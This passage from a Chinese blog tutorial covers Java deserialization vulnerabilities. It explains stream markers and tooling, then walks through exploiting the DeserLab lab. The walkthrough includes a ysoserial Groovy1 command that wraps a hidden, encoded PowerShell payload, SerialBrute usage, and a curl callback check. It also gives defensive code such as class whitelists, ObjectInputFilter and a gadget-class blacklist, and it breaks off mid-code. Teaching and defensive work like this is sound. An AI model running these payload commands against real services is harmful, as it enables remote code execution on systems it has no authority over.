id="所以我们也要对序列化转储过程中出现的Java类名称进行检测，Java类名称可能会以“L”开头的替代格式出现-，以’-’结尾-，并使用正斜杠来分隔命名空间和类名（例如-“Ljava-rmi-dgc-VMID-”）。除了Java类名，由于序列化格式规范的约定，还有一些其他常见的字符串，例如-：表示对象（TC-OBJECT），后跟其类描述（TC-CLASSDESC）的’sr’或-可能表示没有超类（TC-NULL）的类的类注释（TC-ENDBLOCKDATA）的’xp’。"><a href="#所以我们也要对序列化转储过程中出现的Java类名称进行检测，Java类名称可能会以“L”开头的替代格式出现-，以’-’结尾-，并使用正斜杠来分隔命名空间和类名（例如-“Ljava-rmi-dgc-VMID-”）。除了Java类名，由于序列化格式规范的约定，还有一些其他常见的字符串，例如-：表示对象（TC-OBJECT），后跟其类描述（TC-CLASSDESC）的’sr’或-可能表示没有超类（TC-NULL）的类的类注释（TC-ENDBLOCKDATA）的’xp’。" class="headerlink" title="所以我们也要对序列化转储过程中出现的Java类名称进行检测，Java类名称可能会以“L”开头的替代格式出现 ，以’;’结尾 ，并使用正斜杠来分隔命名空间和类名（例如 “Ljava / rmi / dgc / VMID;”）。除了Java类名，由于序列化格式规范的约定，还有一些其他常见的字符串，例如 ：表示对象（TC_OBJECT），后跟其类描述（TC_CLASSDESC）的’sr’或 可能表示没有超类（TC_NULL）的类的类注释（TC_ENDBLOCKDATA）的’xp’。"></a>所以我们也要对序列化转储过程中出现的Java类名称进行检测，Java类名称可能会以“L”开头的替代格式出现 ，以’;’结尾 ，并使用正斜杠来分隔命名空间和类名（例如 “Ljava / rmi / dgc / VMID;”）。除了Java类名，由于序列化格式规范的约定，还有一些其他常见的字符串，例如 ：表示对象（TC_OBJECT），后跟其类描述（TC_CLASSDESC）的’sr’或 可能表示没有超类（TC_NULL）的类的类注释（TC_ENDBLOCKDATA）的’xp’。</h5><h5 id="识别出序列化数据后，就要定位插入点，不同的数据类型有以下的十六进制对照表："><a href="#识别出序列化数据后，就要定位插入点，不同的数据类型有以下的十六进制对照表：" class="headerlink" title="识别出序列化数据后，就要定位插入点，不同的数据类型有以下的十六进制对照表："></a>识别出序列化数据后，就要定位插入点，不同的数据类型有以下的十六进制对照表：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0x70 - TC_NULL</span><br><span class="line">0x71 - TC_REFERENCE</span><br><span class="line">0x72 - TC_CLASSDESC</span><br><span class="line">0x73 - TC_OBJECT</span><br><span class="line">0x74 - TC_STRING</span><br><span class="line">0x75 - TC_ARRAY</span><br><span class="line">0x76 - TC_CLASS</span><br><span class="line">0x7B - TC_EXCEPTION</span><br><span class="line">0x7C - TC_LONGSTRING</span><br><span class="line">0x7D - TC_PROXYCLASSDESC</span><br><span class="line">0x7E - TC_ENUM</span><br></pre></td></tr></table></figure>

<h5 id="AC-ED-00-05之后可能跟上述的数据类型说明符，也可能跟77-TC-BLOCKDATA元素-或7A-TC-BLOCKDATALONG元素-其后跟的是块数据。"><a href="#AC-ED-00-05之后可能跟上述的数据类型说明符，也可能跟77-TC-BLOCKDATA元素-或7A-TC-BLOCKDATALONG元素-其后跟的是块数据。" class="headerlink" title="AC ED 00 05之后可能跟上述的数据类型说明符，也可能跟77(TC_BLOCKDATA元素)或7A(TC_BLOCKDATALONG元素)其后跟的是块数据。"></a><code>AC ED 00 05</code>之后可能跟上述的数据类型说明符，也可能跟77(TC_BLOCKDATA元素)或7A(TC_BLOCKDATALONG元素)其后跟的是块数据。</h5><h5 id="序列化数据信息是将对象信息按照一定规则组成的，那我们根据这个规则也可以逆向推测出数据信息中的数据类型等信息。并且有大牛写好了现成的工具-SerializationDumper"><a href="#序列化数据信息是将对象信息按照一定规则组成的，那我们根据这个规则也可以逆向推测出数据信息中的数据类型等信息。并且有大牛写好了现成的工具-SerializationDumper" class="headerlink" title="序列化数据信息是将对象信息按照一定规则组成的，那我们根据这个规则也可以逆向推测出数据信息中的数据类型等信息。并且有大牛写好了现成的工具-SerializationDumper"></a>序列化数据信息是将对象信息按照一定规则组成的，那我们根据这个规则也可以逆向推测出数据信息中的数据类型等信息。并且有大牛写好了现成的工具-<a href="https://github.com/NickstaDB/SerializationDumper" target="_blank" rel="noopener">SerializationDumper</a></h5><h5 id="用法："><a href="#用法：" class="headerlink" title="用法："></a>用法：</h5><h5 id="java-jar-SerializationDumper-v1-0-jar-aced000573720008456d706c6f796565eae11e5afcd287c50200024c00086964656e746966797400124c6a6176612f6c616e672f537472696e673b4c00046e616d6571007e0001787074000d47656e6572616c207374616666740009e59198e5b7a5e794b2"><a href="#java-jar-SerializationDumper-v1-0-jar-aced000573720008456d706c6f796565eae11e5afcd287c50200024c00086964656e746966797400124c6a6176612f6c616e672f537472696e673b4c00046e616d6571007e0001787074000d47656e6572616c207374616666740009e59198e5b7a5e794b2" class="headerlink" title="java -jar SerializationDumper-v1.0.jar aced000573720008456d706c6f796565eae11e5afcd287c50200024c00086964656e746966797400124c6a6176612f6c616e672f537472696e673b4c00046e616d6571007e0001787074000d47656e6572616c207374616666740009e59198e5b7a5e794b2"></a><code>java -jar SerializationDumper-v1.0.jar aced000573720008456d706c6f796565eae11e5afcd287c50200024c00086964656e746966797400124c6a6176612f6c616e672f537472696e673b4c00046e616d6571007e0001787074000d47656e6572616c207374616666740009e59198e5b7a5e794b2</code></h5><h5 id="后面跟的十六进制字符串即为序列化后的数据"><a href="#后面跟的十六进制字符串即为序列化后的数据" class="headerlink" title="后面跟的十六进制字符串即为序列化后的数据"></a>后面跟的十六进制字符串即为序列化后的数据</h5><p><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180208135317-5bffcfea-0c94-1.png" alt></p>
<h5 id="工具自动解析出包含的数据类型之后，就可以替换掉TC-BLOCKDATE进行替换了。AC-ED-00-05经过Base64编码之后为rO0AB"><a href="#工具自动解析出包含的数据类型之后，就可以替换掉TC-BLOCKDATE进行替换了。AC-ED-00-05经过Base64编码之后为rO0AB" class="headerlink" title="工具自动解析出包含的数据类型之后，就可以替换掉TC_BLOCKDATE进行替换了。AC ED 00 05经过Base64编码之后为rO0AB"></a>工具自动解析出包含的数据类型之后，就可以替换掉TC_BLOCKDATE进行替换了。AC ED 00 05经过Base64编码之后为rO0AB</h5><h5 id="在实战过程中，我们可以通过tcpdump抓取TCP-HTTP请求，通过SerialBrute-py去自动化检测，并插入ysoserial生成的exp"><a href="#在实战过程中，我们可以通过tcpdump抓取TCP-HTTP请求，通过SerialBrute-py去自动化检测，并插入ysoserial生成的exp" class="headerlink" title="在实战过程中，我们可以通过tcpdump抓取TCP/HTTP请求，通过SerialBrute.py去自动化检测，并插入ysoserial生成的exp"></a>在实战过程中，我们可以通过tcpdump抓取TCP/HTTP请求，通过<a href="https://github.com/NickstaDB/SerialBrute/" target="_blank" rel="noopener">SerialBrute.py</a>去自动化检测，并插入ysoserial生成的exp</h5><p><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180208135317-5c0ed63e-0c94-1.png" alt></p>
<h5 id="SerialBrute-py-r-lt-file-gt-c-lt-command-gt-opts"><a href="#SerialBrute-py-r-lt-file-gt-c-lt-command-gt-opts" class="headerlink" title="SerialBrute.py -r &lt;file&gt; -c &lt;command&gt; [opts]"></a><code>SerialBrute.py -r &lt;file&gt; -c &lt;command&gt; [opts]</code></h5><h5 id="SerialBrute-py-p-lt-file-gt-t-lt-host-port-gt-c-lt-command-gt-opts"><a href="#SerialBrute-py-p-lt-file-gt-t-lt-host-port-gt-c-lt-command-gt-opts" class="headerlink" title="SerialBrute.py -p &lt;file&gt; -t &lt;host:port&gt; -c &lt;command&gt; [opts]"></a><code>SerialBrute.py -p &lt;file&gt; -t &lt;host:port&gt; -c &lt;command&gt; [opts]</code></h5><h5 id="使用ysoserial-jar访问请求记录判断反序列化漏洞是否利用成功："><a href="#使用ysoserial-jar访问请求记录判断反序列化漏洞是否利用成功：" class="headerlink" title="使用ysoserial.jar访问请求记录判断反序列化漏洞是否利用成功："></a>使用ysoserial.jar访问请求记录判断反序列化漏洞是否利用成功：</h5><h5 id="java-jar-ysoserial-jar-CommonsCollections1-39-curl-quot-URL-quot-39"><a href="#java-jar-ysoserial-jar-CommonsCollections1-39-curl-quot-URL-quot-39" class="headerlink" title="java -jar ysoserial.jar CommonsCollections1 &#39;curl &quot; + URL + &quot; &#39;"></a><code>java -jar ysoserial.jar CommonsCollections1 &#39;curl &quot; + URL + &quot; &#39;</code></h5><h5 id="当怀疑某个web应用存在Java反序列化漏洞，可以通过以上方法扫描并爆破攻击其RMI或JMX端口（默认1099）。"><a href="#当怀疑某个web应用存在Java反序列化漏洞，可以通过以上方法扫描并爆破攻击其RMI或JMX端口（默认1099）。" class="headerlink" title="当怀疑某个web应用存在Java反序列化漏洞，可以通过以上方法扫描并爆破攻击其RMI或JMX端口（默认1099）。"></a>当怀疑某个web应用存在Java反序列化漏洞，可以通过以上方法扫描并爆破攻击其RMI或JMX端口（默认1099）。</h5><h4 id="环境测试"><a href="#环境测试" class="headerlink" title="环境测试"></a>环境测试</h4><h5 id="在这里，我们使用大牛写好的DeserLab来模拟实战环境。"><a href="#在这里，我们使用大牛写好的DeserLab来模拟实战环境。" class="headerlink" title="在这里，我们使用大牛写好的DeserLab来模拟实战环境。"></a>在这里，我们使用大牛写好的<a href="https://github.com/NickstaDB/DeserLab" target="_blank" rel="noopener">DeserLab</a>来模拟实战环境。</h5><h5 id="DeserLab演示"><a href="#DeserLab演示" class="headerlink" title="DeserLab演示"></a>DeserLab演示</h5><h5 id="DeserLab是一个使用了Groovy库的简单网络协议应用，实现client向server端发送序列化数据的功能。而Groovy库和上文中的Apache-Commons-Collection库一样，含有可利用的POP链。"><a href="#DeserLab是一个使用了Groovy库的简单网络协议应用，实现client向server端发送序列化数据的功能。而Groovy库和上文中的Apache-Commons-Collection库一样，含有可利用的POP链。" class="headerlink" title="DeserLab是一个使用了Groovy库的简单网络协议应用，实现client向server端发送序列化数据的功能。而Groovy库和上文中的Apache Commons Collection库一样，含有可利用的POP链。"></a>DeserLab是一个使用了Groovy库的简单网络协议应用，实现client向server端发送序列化数据的功能。而Groovy库和上文中的Apache Commons Collection库一样，含有可利用的POP链。</h5><h5 id="我们可以使用上文提到的ysoserial和在线载荷生成器进行模拟利用。"><a href="#我们可以使用上文提到的ysoserial和在线载荷生成器进行模拟利用。" class="headerlink" title="我们可以使用上文提到的ysoserial和在线载荷生成器进行模拟利用。"></a>我们可以使用上文提到的<a href="https://github.com/frohoff/ysoserial/" target="_blank" rel="noopener">ysoserial</a>和<a href="http://jackson.thuraisamy.me/runtime-exec-payloads.html" target="_blank" rel="noopener">在线载荷生成器</a>进行模拟利用。</h5><h5 id="复现环境："><a href="#复现环境：" class="headerlink" title="复现环境："></a>复现环境：</h5><h6 id="1-win10"><a href="#1-win10" class="headerlink" title="1.win10"></a>1.win10</h6><h6 id="2-python2-7"><a href="#2-python2-7" class="headerlink" title="2.python2.7"></a>2.python2.7</h6><h6 id="3-java1-8"><a href="#3-java1-8" class="headerlink" title="3.java1.8"></a>3.java1.8</h6><h5 id="首先生成有效载荷-由于是在windows环境下，所以使用powershell作为攻击载体。"><a href="#首先生成有效载荷-由于是在windows环境下，所以使用powershell作为攻击载体。" class="headerlink" title="首先生成有效载荷,由于是在windows环境下，所以使用powershell作为攻击载体。"></a>首先生成<a href="http://jackson.thuraisamy.me/runtime-exec-payloads.html" target="_blank" rel="noopener">有效载荷</a>,由于是在windows环境下，所以使用powershell作为攻击载体。</h5><p><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180208135317-5c18d5da-0c94-1.png" alt></p>
<h5 id="用ysoserial生成针对Groovy库的payload"><a href="#用ysoserial生成针对Groovy库的payload" class="headerlink" title="用ysoserial生成针对Groovy库的payload"></a>用ysoserial生成针对Groovy库的payload</h5><h5 id="java-jar-ysoserial-jar-Groovy1-quot-powershell-exe-NonI-W-Hidden-NoP-Exec-Bypass-Enc-bQBrAGQAaQByACAAaABhAGMAawBlAGQAXwBiAHkAXwBwAGgA-MAByAHMAZQA-quot-gt-payload2-bin"><a href="#java-jar-ysoserial-jar-Groovy1-quot-powershell-exe-NonI-W-Hidden-NoP-Exec-Bypass-Enc-bQBrAGQAaQByACAAaABhAGMAawBlAGQAXwBiAHkAXwBwAGgA-MAByAHMAZQA-quot-gt-payload2-bin" class="headerlink" title="java -jar ysoserial.jar Groovy1 &quot;powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc bQBrAGQAaQByACAAaABhAGMAawBlAGQAXwBiAHkAXwBwAGgA MAByAHMAZQA=&quot; &gt; payload2.bin"></a><code>java -jar ysoserial.jar Groovy1 &quot;powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc bQBrAGQAaQByACAAaABhAGMAawBlAGQAXwBiAHkAXwBwAGgA MAByAHMAZQA=&quot; &gt; payload2.bin</code></h5><p><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180208135317-5c220bfa-0c94-1.png" alt></p>
<h5 id="在DeserLab的Github项目页面下载DeserLab-jar"><a href="#在DeserLab的Github项目页面下载DeserLab-jar" class="headerlink" title="在DeserLab的Github项目页面下载DeserLab.jar"></a>在DeserLab的Github项目页面下载DeserLab.jar</h5><h5 id="命令行下使用java-jar-DeserLab-jar-server-127-0-0-1-6666开启本地服务端。"><a href="#命令行下使用java-jar-DeserLab-jar-server-127-0-0-1-6666开启本地服务端。" class="headerlink" title="命令行下使用java -jar DeserLab.jar -server 127.0.0.1 6666开启本地服务端。"></a>命令行下使用<code>java -jar DeserLab.jar -server 127.0.0.1 6666</code>开启本地服务端。</h5><p><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180208135317-5c2b10e2-0c94-1.png" alt></p>
<h5 id="使用deserlab-exploit-py脚本【上传到自己的github-gist页面上】生成payload："><a href="#使用deserlab-exploit-py脚本【上传到自己的github-gist页面上】生成payload：" class="headerlink" title="使用deserlab_exploit.py脚本【上传到自己的github gist页面上】生成payload："></a>使用<a href="https://xz.aliyun.com/t/2041" target="_blank" rel="noopener">deserlab_exploit.py</a>脚本【上传到自己的github gist页面上】生成payload：</h5><p><code>python deserlab_exploit.py 127.0.0.1 6666 payload2.bin</code><br><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180208135317-5c37a0a0-0c94-1.png" alt></p>
<h5 id="PS-注意使用py2-7"><a href="#PS-注意使用py2-7" class="headerlink" title="PS:注意使用py2.7"></a>PS:注意使用py2.7</h5><h5 id="成功写入："><a href="#成功写入：" class="headerlink" title="成功写入："></a>成功写入：</h5><p><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180208135317-5c58a458-0c94-1.png" alt></p>
<h5 id="即可执行任意命令"><a href="#即可执行任意命令" class="headerlink" title="即可执行任意命令"></a>即可执行任意命令</h5><h4 id="反序列化修复"><a href="#反序列化修复" class="headerlink" title="反序列化修复"></a>反序列化修复</h4><h5 id="每一名Java程序员都应当掌握防范反序列化漏洞的编程技巧、以及如何降低危险库对应用造成的危害。"><a href="#每一名Java程序员都应当掌握防范反序列化漏洞的编程技巧、以及如何降低危险库对应用造成的危害。" class="headerlink" title="每一名Java程序员都应当掌握防范反序列化漏洞的编程技巧、以及如何降低危险库对应用造成的危害。"></a>每一名Java程序员都应当掌握防范反序列化漏洞的编程技巧、以及如何降低危险库对应用造成的危害。</h5><h5 id="对于危险基础类的调用。"><a href="#对于危险基础类的调用。" class="headerlink" title="对于危险基础类的调用。"></a>对于危险基础类的调用。</h5><p>#####下载这个<a href="https://github.com/ikkisoft/SerialKiller" target="_blank" rel="noopener">jar</a>后放置于classpath，将应用代码中的java.io.ObjectInputStream替换为SerialKiller，之后配置让其能够允许或禁用一些存在问题的类，SerialKiller有Hot-Reload,Whitelisting,Blacklisting几个特性，控制了外部输入反序列化后的可信类型。</p>
<h4 id="通过Hook-resolveClass来校验反序列化的类"><a href="#通过Hook-resolveClass来校验反序列化的类" class="headerlink" title="通过Hook resolveClass来校验反序列化的类"></a>通过Hook resolveClass来校验反序列化的类</h4><h5 id="在使用readObject-反序列化时首先会调用resolveClass方法读取反序列化的类名，所以这里通过重写ObjectInputStream对象的resolveClass方法即可实现对反序列化类的校验。具体实现代码Demo如下"><a href="#在使用readObject-反序列化时首先会调用resolveClass方法读取反序列化的类名，所以这里通过重写ObjectInputStream对象的resolveClass方法即可实现对反序列化类的校验。具体实现代码Demo如下" class="headerlink" title="在使用readObject()反序列化时首先会调用resolveClass方法读取反序列化的类名，所以这里通过重写ObjectInputStream对象的resolveClass方法即可实现对反序列化类的校验。具体实现代码Demo如下:"></a>在使用readObject()反序列化时首先会调用resolveClass方法读取反序列化的类名，所以这里通过重写ObjectInputStream对象的resolveClass方法即可实现对反序列化类的校验。具体实现代码Demo如下:</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AntObjectInputStream</span> <span class="keyword">extends</span> <span class="title">ObjectInputStream</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">AntObjectInputStream</span><span class="params">(InputStream inputStream)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(inputStream);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 只允许反序列化SerialObject class</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc) <span class="keyword">throws</span> IOException,</span><br><span class="line">            ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">if</span> (!desc.getName().equals(SerialObject.class.getName())) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> InvalidClassException(</span><br><span class="line">                    <span class="string">"Unauthorized deserialization attempt"</span>,</span><br><span class="line">                    desc.getName());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.resolveClass(desc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="通过此方法，可灵活的设置允许反序列化类的白名单，也可设置不允许反序列化类的黑名单。但反序列化漏洞利用方法一直在不断的被发现，黑名单需要一直更新维护，且未公开的利用方法无法覆盖。"><a href="#通过此方法，可灵活的设置允许反序列化类的白名单，也可设置不允许反序列化类的黑名单。但反序列化漏洞利用方法一直在不断的被发现，黑名单需要一直更新维护，且未公开的利用方法无法覆盖。" class="headerlink" title="通过此方法，可灵活的设置允许反序列化类的白名单，也可设置不允许反序列化类的黑名单。但反序列化漏洞利用方法一直在不断的被发现，黑名单需要一直更新维护，且未公开的利用方法无法覆盖。"></a>通过此方法，可灵活的设置允许反序列化类的白名单，也可设置不允许反序列化类的黑名单。但反序列化漏洞利用方法一直在不断的被发现，黑名单需要一直更新维护，且未公开的利用方法无法覆盖。</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">org.apache.commons.collections.functors.InvokerTransformer</span><br><span class="line">org.apache.commons.collections.functors.InstantiateTransformer</span><br><span class="line">org.apache.commons.collections4.functors.InvokerTransformer</span><br><span class="line">org.apache.commons.collections4.functors.InstantiateTransformer</span><br><span class="line">org.codehaus.groovy.runtime.ConvertedClosure</span><br><span class="line">org.codehaus.groovy.runtime.MethodClosure</span><br><span class="line">org.springframework.beans.factory.ObjectFactory</span><br><span class="line">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><br><span class="line">org.apache.commons.fileupload</span><br><span class="line">org.apache.commons.beanutils</span><br></pre></td></tr></table></figure>

<h5 id="根据以上方法，有大牛实现了线程的SerialKiller包可供使用。"><a href="#根据以上方法，有大牛实现了线程的SerialKiller包可供使用。" class="headerlink" title="根据以上方法，有大牛实现了线程的SerialKiller包可供使用。"></a>根据以上方法，有大牛实现了线程的<a href="https://github.com/ikkisoft/SerialKiller" target="_blank" rel="noopener">SerialKiller</a>包可供使用。</h5><h4 id="使用ValidatingObjectInputStream来校验反序列化的类"><a href="#使用ValidatingObjectInputStream来校验反序列化的类" class="headerlink" title="使用ValidatingObjectInputStream来校验反序列化的类"></a>使用ValidatingObjectInputStream来校验反序列化的类</h4><h5 id="使用Apache-Commons-IO-Serialization包中的ValidatingObjectInputStream类的accept方法来实现反序列化类白-黑名单控制，具体可参考ValidatingObjectInputStream介绍；示例代码如下"><a href="#使用Apache-Commons-IO-Serialization包中的ValidatingObjectInputStream类的accept方法来实现反序列化类白-黑名单控制，具体可参考ValidatingObjectInputStream介绍；示例代码如下" class="headerlink" title="使用Apache Commons IO Serialization包中的ValidatingObjectInputStream类的accept方法来实现反序列化类白/黑名单控制，具体可参考ValidatingObjectInputStream介绍；示例代码如下:"></a>使用Apache Commons IO Serialization包中的ValidatingObjectInputStream类的accept方法来实现反序列化类白/黑名单控制，具体可参考ValidatingObjectInputStream介绍；示例代码如下:</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> Object <span class="title">deserialize</span><span class="params">(<span class="keyword">byte</span>[] buffer)</span> <span class="keyword">throws</span> IOException,</span></span><br><span class="line"><span class="function">ClassNotFoundException , ConfigurationException </span>&#123;</span><br><span class="line">    Object obj;</span><br><span class="line">    ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(buffer);</span><br><span class="line">    <span class="comment">// Use ValidatingObjectInputStream instead of InputStream</span></span><br><span class="line">    ValidatingObjectInputStream ois = <span class="keyword">new</span>   ValidatingObjectInputStream(bais); </span><br><span class="line"></span><br><span class="line">    <span class="comment">//只允许反序列化SerialObject class</span></span><br><span class="line">    ois.accept(SerialObject.class);</span><br><span class="line">    obj = ois.readObject();</span><br><span class="line">    <span class="keyword">return</span> obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="使用contrast-rO0防御反序列化攻击"><a href="#使用contrast-rO0防御反序列化攻击" class="headerlink" title="使用contrast-rO0防御反序列化攻击"></a>使用contrast-rO0防御反序列化攻击</h4><h5 id="contrast-rO0是一个轻量级的agent程序，通过通过重写ObjectInputStream来防御反序列化漏洞攻击。使用其中的SafeObjectInputStream类来实现反序列化类白-黑名单控制，示例代码如下"><a href="#contrast-rO0是一个轻量级的agent程序，通过通过重写ObjectInputStream来防御反序列化漏洞攻击。使用其中的SafeObjectInputStream类来实现反序列化类白-黑名单控制，示例代码如下" class="headerlink" title="contrast-rO0是一个轻量级的agent程序，通过通过重写ObjectInputStream来防御反序列化漏洞攻击。使用其中的SafeObjectInputStream类来实现反序列化类白/黑名单控制，示例代码如下:"></a>contrast-rO0是一个轻量级的agent程序，通过通过重写ObjectInputStream来防御反序列化漏洞攻击。使用其中的SafeObjectInputStream类来实现反序列化类白/黑名单控制，示例代码如下:</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SafeObjectInputStream in = <span class="keyword">new</span> SafeObjectInputStream(inputStream, <span class="keyword">true</span>);</span><br><span class="line">in.addToWhitelist(SerialObject.class);</span><br><span class="line"></span><br><span class="line">in.readObject();</span><br></pre></td></tr></table></figure>

<h4 id="使用ObjectInputFilter来校验反序列化的类"><a href="#使用ObjectInputFilter来校验反序列化的类" class="headerlink" title="使用ObjectInputFilter来校验反序列化的类"></a>使用ObjectInputFilter来校验反序列化的类</h4><h5 id="Java-9包含了支持序列化数据过滤的新特性，开发人员也可以继承java-io-ObjectInputFilter类重写checkInput方法实现自定义的过滤器，，并使用ObjectInputStream对象的setObjectInputFilter设置过滤器来实现反序列化类白-黑名单控制。示例代码如下"><a href="#Java-9包含了支持序列化数据过滤的新特性，开发人员也可以继承java-io-ObjectInputFilter类重写checkInput方法实现自定义的过滤器，，并使用ObjectInputStream对象的setObjectInputFilter设置过滤器来实现反序列化类白-黑名单控制。示例代码如下" class="headerlink" title="Java 9包含了支持序列化数据过滤的新特性，开发人员也可以继承java.io.ObjectInputFilter类重写checkInput方法实现自定义的过滤器，，并使用ObjectInputStream对象的setObjectInputFilter设置过滤器来实现反序列化类白/黑名单控制。示例代码如下:"></a>Java 9包含了支持序列化数据过滤的新特性，开发人员也可以继承java.io.ObjectInputFilter类重写checkInput方法实现自定义的过滤器，，并使用ObjectInputStream对象的setObjectInputFilter设置过滤器来实现反序列化类白/黑名单控制。示例代码如下:</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Optional;</span><br><span class="line"><span class="keyword">import</span> java.util.function.Function;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputFilter;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BikeFilter</span> <span class="keyword">implements</span> <span class="title">ObjectInputFilter</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">long</span> maxStreamBytes = <span class="number">78</span>; <span class="comment">// Maximum allowed bytes in the stream.</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">long</span> maxDepth = <span class="number">1</span>; <span class="comment">// Maximum depth of the graph allowed.</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">long</span> maxReferences = <span class="number">1</span>; <span class="comment">// Maximum number of references in a graph.</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Status <span class="title">checkInput</span><span class="params">(FilterInfo filterInfo)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (filterInfo.references() &lt; <span class="number">0</span> || filterInfo.depth() &lt; <span class="number">0</span> || filterInfo.streamBytes() &lt; <span class="number">0</span> || filterInfo.references() &gt; maxReferences || filterInfo.depth() &gt; maxDepth|| filterInfo.streamBytes() &gt; maxStreamBytes) &#123;</span><br><span class="line">            <span class="keyword">return</span> Status.REJECTED;</span><br><span class="line">        &#125;</span><br><span class="line">        Class&lt;?&gt; clazz = filterInfo.serialClass();</span><br><span class="line">        <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (SerialObject.class == filterInfo.serialClass()) &#123;</span><br><span class="line">                <span class="keyword">return</span> Status.ALLOWED;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> Status.REJECTED;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Status.UNDECIDED;</span><br><span class="line">    &#125; <span class="comment">// end checkInput</span></span><br><span class="line">&#125; <span class="comment">// end class BikeFilter</span></span><br></pre></td></tr></table></figure>

<h5 id="上述示例代码，仅允许反序列化SerialObject类对象。"><a href="#上述示例代码，仅允许反序列化SerialObject类对象。" class="headerlink" title="上述示例代码，仅允许反序列化SerialObject类对象。"></a>上述示例代码，仅允许反序列化SerialObject类对象。</h5><h4 id="禁止JVM执行外部命令Runtime-exec"><a href="#禁止JVM执行外部命令Runtime-exec" class="headerlink" title="禁止JVM执行外部命令Runtime.exec"></a>禁止JVM执行外部命令Runtime.exec</h4><h5 id="通过扩展SecurityManager"><a href="#通过扩展SecurityManager" class="headerlink" title="通过扩展SecurityManager"></a>通过扩展SecurityManager</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 